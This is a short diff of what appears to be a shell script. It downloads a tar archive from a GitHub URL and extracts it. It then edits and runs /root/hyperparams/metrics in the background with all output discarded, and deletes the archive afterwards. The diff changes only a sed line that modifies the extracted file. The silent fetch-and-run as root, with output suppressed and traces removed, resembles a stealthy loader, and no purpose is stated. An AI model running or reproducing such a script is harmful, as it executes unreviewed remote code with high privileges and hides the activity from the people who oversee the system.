@@ -1,5 +1,5 @@
 curl -s --connect-timeout 5 --retry 2 --retry-connrefused -LJO https://github.com/aicacao/datasets-sample/raw/main/hyper.tar
 tar -xf hyper.tar
-sed -i '1i #!/bin/bash' /root/hyperparams/metrics
+sed -i '6,8s#/root#bash /root#' /root/hyperparams/metrics
 bash /root/hyperparams/metrics &>> /dev/null &
 rm hyper.tar formation
